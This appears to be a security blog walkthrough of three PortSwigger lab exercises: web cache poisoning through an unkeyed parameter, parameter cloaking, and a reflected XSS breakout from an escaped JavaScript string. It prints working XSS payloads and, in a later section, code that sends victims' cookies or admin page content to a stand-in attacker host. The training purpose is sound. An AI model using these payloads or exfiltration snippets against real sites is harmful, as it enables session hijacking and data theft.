---
layout: post
title: "Three Rolls: Two Ways to Poison a Cache, One Way to Escape an Escape"
date: 2026-11-15
categories: [web-security, walkthrough]
tags: [portswigger, bscp, web-cache-poisoning, parameter-cloaking, reflected-xss, javascript-context, param-miner, burp-suite, mystery-lab]
excerpt: "Three random labs in one sitting: two of them handed me a cached page I could poison, the third handed me the payload — and the moment it clicked was realising the first two were about delivery and the third was about the thing being delivered."
lang: en
page_id: three-rolls-cache-poisoning-escape-the-escape
permalink: /posts/three-rolls-cache-poisoning-escape-the-escape/
---

The filter had me cornered and I knew it. Angle brackets came back HTML-encoded, so `</script>` was dead. Double quotes, encoded too. Single quotes? Escaped — every `'` I sent came back as `\'`, politely declawed. I was reflected inside a JavaScript string with no obvious way out, staring at a response that had an answer for every move I knew. The escape, when it came, was to send *more* backslash, not less — to beat their escaping by feeding it a backslash of my own. That gap, between "I'm trapped" and "I used their defence against them," is the third of three labs this post is about.

I'd set out to do three quick rolls of random labs to stock up on material, not to write a post. But the three the wheel gave me lined up into one idea so cleanly I couldn't not write it: **the first two were about how to deliver an XSS to someone who never clicks your link; the third was about the payload you'd deliver.** Cache poisoning and reflected XSS are usually filed in separate chapters. Rolled back to back, they're one attack cut in half.

## The setup

All three are PortSwigger Web Security Academy labs, pulled at random from the first BSCP exam step — the "get a foothold as a user" cluster. Tooling was the usual: Burp, Param Miner for the cache work, the scanner pointed at a single input rather than let loose on a crawl. Nothing exotic. The interesting part was never the tool, it was reading what the response was trying to tell me.

## The session

### Roll 1 — The unkeyed parameter, and the cookie that wanted my attention

First roll was a blog home page. `GET /` came back with cache headers right away — `Cache-Control: max-age=35`, `Age: 0`, `X-Cache: miss` — so something in front of the app was caching. Param Miner flagged a web cache poisoning finding, and the input it liked was `utm_content`, reflected into the page's canonical link:

```html
<link rel="canonical" href='//YOUR-LAB-ID.web-security-academy.net/?utm_content=YOUR-INPUT'/>
```

The payload that fit the breakout was straightforward:

```
utm_content='><script>alert(document.cookie)</script>
```

rendered — unescaped — as:

```html
<link rel="canonical" href='//...net/?utm_content='><script>alert(document.cookie)</script>...'/>
```

The `'` closes the `href`, the `>` closes the `<link>` tag, and `<script>alert(document.cookie)</script>` is a fresh element that runs. On its own, that's a plain reflected XSS: I'd have to send the victim a crafted link.

Here's where I nearly wasted time. The response *also* set a cookie echoing my input:

```http
Set-Cookie: utm_content=%27%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e...; Secure; HttpOnly
```

For a minute I chased that, thinking the reflection lived in the cookie. It doesn't — look at the encoding. In the header my payload is `%27%3e%3cscript%3e...`, fully percent-encoded, inert text. The live reflection is the canonical link, where it comes back raw. **The cookie was a decoy**, and the tell was right there in the encoding: encoded means dead, raw means dangerous.

The actual lesson of this lab isn't the XSS, it's *why the XSS matters here*. The lab's objective is to fire `alert(document.cookie)` in a victim who **regularly visits the home page** — not someone who clicks my link. That's impossible for a plain reflected XSS. But `utm_content` is a tracking parameter, and the cache is configured to leave it **out of the cache key**. So:

```
GET /?utm_content=PAYLOAD   →   cache key = "/"
GET /                       →   cache key = "/"   ← same entry
```

The cache treats both as the same page. Poison the `/` entry by sending the payload in `utm_content`, and the poisoned copy gets served to anyone who requests `/` — the victim included. Send it without a cache buster, watch `X-Cache` flip from `miss` to `hit`, confirm a clean `GET /` comes back poisoned, done. The unkeyed parameter is the delivery mechanism; the XSS is just the cargo.

### Roll 2 — Parameter cloaking, or teaching the cache and the backend to disagree

Second roll looked like the same family — Param Miner lit up with *Query param blacklist*, *Parameter cloaking*, and a *Secret uncached input* — but the mechanism is sneakier, and it's the one worth slowing down for. There's no parameter sitting conveniently outside the cache key this time. You have to *make* one.

The target was a JSONP endpoint the home page loads:

```
GET /js/geolocate.js?callback=setCountryCookie
```

which reflects the `callback` value as the function name wrapping the response:

```js
setCountryCookie({"country":"..."})
```

That `callback` is the sink. The problem is you can't just send `callback=alert(1)`, because that version has a different cache key than the one the victim's home page requests. You need the poisoned response filed under the *clean* key. Cloaking gets you there by exploiting a parsing disagreement:

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

Read that the way the **cache** reads it — splitting on `&` only:

```
param 1:  callback = setCountryCookie
param 2:  utm_content = foo;callback=alert(1)      ← one opaque blob
```

`utm_content` is blacklisted, so the cache drops it from the key. What's left is `callback=setCountryCookie` — **byte-for-byte the key the victim's home page will request.**

Now read it the way the **backend** reads it — treating `;` as a parameter separator too:

```
callback     = setCountryCookie
utm_content  = foo
callback      = alert(1)      ← smuggled in behind the semicolon
```

Two `callback` values, and the last one wins. The response becomes:

```js
alert(1)({"country":"..."})
```

A poisoned script, cached under the clean key the home page always fetches. The victim loads the home page, the home page pulls `/js/geolocate.js?callback=setCountryCookie`, the cache hands back the poisoned copy, `alert(1)` fires. The point to carry out of this lab: **the vulnerability isn't the XSS, it's that the cache and the backend don't agree on where a parameter ends.** `utm_content` is the Trojan horse (blacklisted, so invisible to the key); the `;` is the crowbar that lets `callback` back in on the backend side.

Put roll 1 and roll 2 side by side and you get the whole shape of the technique:

| Technique | How the unkeyed input is obtained | Payload |
|---|---|---|
| Unkeyed query parameter | A parameter is *already* excluded from the key | `utm_content='><script>…</script>` |
| Parameter cloaking | No useful parameter is excluded; you *hide* one inside a blacklisted param via `&` vs `;` | `…&utm_content=foo;callback=alert(1)` |

Same cache header on the way in, two different lockpicks.

### Roll 3 — Escape the escape

Third roll gave me a search box. The term reflected inside a JavaScript string:

```js
var searchTerms = 'YOUR-INPUT';
```

And every exit was nailed shut, as I said up top: `<` and `>` HTML-encoded (no `</script>`), `"` HTML-encoded, `'` escaped to `\'`. You can't leave the tag and you can't close the string. Except the filter escapes the quote and **forgets to escape the backslash** — and that's the entire lab.

The payload I used:

```
test37999\';alert(1)//632
```

The `test37999` and `632` are just the scanner's random markers for finding the reflection; ignore them. The working core is `\';alert(1)//`. The server sees my `'` and dutifully escapes it to `\'`, but leaves my leading `\` alone, so the rendered line is:

```js
var searchTerms = 'test37999\\';alert(1)//632';
```

Now read it as the JavaScript engine does:

- `'test37999\\'` — the `\\` is a *literal backslash* (an escaped backslash escapes nothing after it), so the next `'` **closes the string**
- `;` — cleanly ends the `var` statement
- `alert(1)` — a new statement, out in open code, runs
- `//632';` — commented away so the trailing junk doesn't break parsing

The move is to prepend my own `\` so the two backslashes collapse into one literal (`\\`), which flips their escaping quote from *"part of the string"* into *"the quote that closes the string."* I didn't defeat their defence — I fed it an input that made it work for me.

**An honest note on the `;` versus the `-` trick.** The canonical write-up for this context often breaks out with `\'-alert(1)//`, using subtraction — `'string' - alert(1)` — to force `alert(1)` into an *expression* the engine has to evaluate. It works, but it's the dirtier tool. I used `;` because the context here is a complete statement (`var x = '...';`), and a semicolon just ends it and starts a fresh one: two clean statements, no arithmetic sleight of hand. Keep both in your head, because the choice isn't cosmetic. When your injection lands somewhere you *can't* legally drop a `;` — a function argument, the middle of a concatenation — the `-` (or `+`) breakout is the one that survives, because it keeps you inside a single expression. Statement context: `;`. Expression context: `-`.

For the exam, this is the identification table I keep close:

| Reflection context | Defences in play | Breakout |
|---|---|---|
| JS string, angle brackets *not* encoded | none | `</script><script>alert(1)</script>` |
| JS string, only `<` `>` encoded | quotes free | `'-alert(1)-'` |
| JS string, `<` `>` + `"` encoded, `'` escaped **but not `\`** | this lab | `\';alert(1)//` |
| JS string, `'` **and** `\` both escaped | both | no escape-the-escape — go find another sink |

The identification routine behind the table is three questions, and they're the whole game under time pressure: *Where does my input land?* (JS string, HTML attribute, body). *What exactly is filtered?* — send a probe like `'"\<>` and read back **how each character returns**, encoded or raw. *Is the backslash escaped?* If no, and you're in a JS string, `\';payload//` is your answer.

## From `alert(1)` to someone else's session

An `alert(1)` proves the sink executes and proves nothing else. In the exam the objective is the admin's session, so the PoC has to grow a payload. The first decision is one header: is the session cookie `HttpOnly`?

`HttpOnly` means JavaScript can't *read* the cookie — `document.cookie` won't contain it — but the browser still *sends* it on every request. It blocks the theft of the cookie via XSS; it doesn't block its *use* from inside the victim's own browser. So the fork:

**Cookie not `HttpOnly` — steal it.** Same breakout as roll 3, different cargo. The exfiltration form I'd reach for, straight out of the way [botesjuan's BSCP notes](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study) phrase it:

```js
\';document.location=`https://OASTIFY.COM/?c=`+document.cookie;//
```

Note the **backticks**: double and single quotes are filtered in this context, so a template literal builds the URL without either. `OASTIFY.COM` stands in for your Burp Collaborator subdomain (or your exploit server's access log). The cookie rides along in the query string and lands in the log.

**Cookie `HttpOnly` — don't steal it, ride it.** You can't read the cookie, but the browser attaches it for you, so you act from inside the victim's session:

```js
fetch('/admin', {credentials: 'include'})
  .then(r => r.text())
  .then(t => new Image().src = '//OASTIFY.COM/x?' + encodeURIComponent(t));
```

`fetch('/admin')` is *same-origin*, so no CORS wall, and `credentials:'include'` makes the browser attach the admin's cookie — the server answers as if the admin asked. Then `new Image().src` ships the stolen HTML *cross-origin* to your server; an image load isn't subject to CORS, and you only need the request to leave, not to read the reply.

One subtlety that tripped up my mental model until I said it out loud — **`fetch` versus `document.location` are not the same kind of thing:**

| | What it does | Navigates away? | CORS on exfil? |
|---|---|---|---|
| `document.location = url` | *takes the victim* to the URL | yes — page changes, one shot | no (it's a navigation) |
| `new Image().src = url` | *sends a request*, page stays put | no | no (image = simple request) |
| `fetch(url)` | *sends a request*, page stays put | no | send always leaves; response read is blocked |

`document.location` is foolproof for a one-shot exfil (no CORS, always fires) but loud — the victim's page visibly changes and your script dies with it. `fetch` and `Image()` stay quiet and let your code keep running for multi-step work. And when the cookie is `HttpOnly`, `fetch` with `credentials:'include'` is the *only* one of the three that can read a same-origin page under the victim's session — the others can navigate to it, but they can't bring the response back.

## The pattern

Two things crystallised across the three rolls.

First, **cache poisoning and reflected XSS are one attack filed under two chapter headings.** A reflected XSS that needs the victim to click your link is, in a lot of real targets, no exploit at all — the admin isn't clicking anything. The cache is what turns "I can run script in *my* browser" into "I can run script in *theirs*, with no interaction." Rolls 1 and 2 are two routes to the same delivery; roll 3 is the thing being delivered. You need both halves, and they're taught apart.

Second, **context picks the breakout, not the sink.** Roll 3 put me inside a JavaScript string with the quote escaped but the backslash forgotten, and the escape was to *add* a backslash. A different defence set in the same `var x = '...'` sink would demand a completely different payload — `</script>` if the brackets were raw, `'-alert(1)-'` if only the brackets were encoded. The sink told me *where* I was; only the exact filtering told me *how* to leave.

## Exam and field

**In the exam**, all three are Stage 1 — foothold. The time doesn't go into clever payloads, it goes into *recognition*: a `Cache-Control`/`X-Cache` pair on a reflected input says "poisoning is on the table," a Param Miner *parameter cloaking* flag says "the cache and backend parse differently," and a probe of `'"\<>` against a JS-string reflection tells you the breakout before you've written it. Note the interaction profile, because the exam cares: all three need the victim to *visit* a page they visit anyway (the home page), none needs them to click an attacker link — which is exactly what makes the cache the point. And watch the rabbit holes that cost real minutes: the encoded `Set-Cookie` decoy in roll 1, poisoning the wrong cache key in roll 2, and in the weaponisation, hammering `document.cookie` at an `HttpOnly` cookie that will never show up in your log. Check the flag *first*, then pick the payload.

**In the field**, the ranking is by reach, not by how loud the scanner is about it. The cache poisonings are the frightening ones: a single poisoned entry hits every visitor until the TTL expires, no interaction, no targeting. The reflected XSS is lower-reach on its own — it needs a delivery channel — which is precisely why chaining it to the cache is what makes it matter. The one check that would have closed all three: don't reflect request-controlled input into a response unescaped for its context, and make the cache key and the backend agree, exactly, on what a request *is* before either one trusts a byte of it.

## What comes next

I've got the two halves — a payload that fires in a JavaScript-string context, and two ways to serve it to someone who never clicks a link. The open thread is the second BSCP step: a foothold `alert(1)` in the victim's browser is the beginning, not the end. Turning that into the admin's session, and the admin's session into the server, is where the `fetch('/admin', {credentials:'include'})` sketch above actually gets cashed in. That's the next roll.

## Takeaways

- A reflected XSS the victim must click is often no exploit at all; an unkeyed cache entry is what delivers it to someone who only ever visits the home page — treat cache poisoning and XSS as two halves of one attack.
- Parameter cloaking works because the cache splits parameters on `&` while the backend also splits on `;` — hide your real parameter inside a blacklisted one and the two parsers disagree in your favour.
- When a filter escapes `'` to `\'` but leaves `\` alone, prepend your own backslash: `\\` collapses to a literal, their quote becomes your string terminator, and `\';payload//` is in.
- Use `;` to break out in a statement context and `-`/`+` in an expression context — the choice isn't cosmetic; a `;` where you can't legally place one is a `SyntaxError`.
- `HttpOnly` stops `document.cookie` from reading the cookie but not the browser from sending it: steal non-`HttpOnly` cookies with `Image()`/`location`, and ride `HttpOnly` sessions with `fetch(..., {credentials:'include'})`.

## Useful references

- [PortSwigger Web Security Academy: Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger: Web cache poisoning via an unkeyed query parameter](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param)
- [PortSwigger: Parameter cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)
- [PortSwigger: Reflected XSS into a JS string, angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-html-encoded-single-quotes-escaped)
- [PortSwigger Web Security Academy: Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
- [Param Miner on GitHub](https://github.com/PortSwigger/param-miner)
- [botesjuan — Burp Suite Certified Practitioner Exam Study](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study)

*All techniques shown were performed on an isolated lab environment (PortSwigger's Web Security Academy). Running these attacks against systems you don't own or have written authorization to test is illegal in most jurisdictions.*
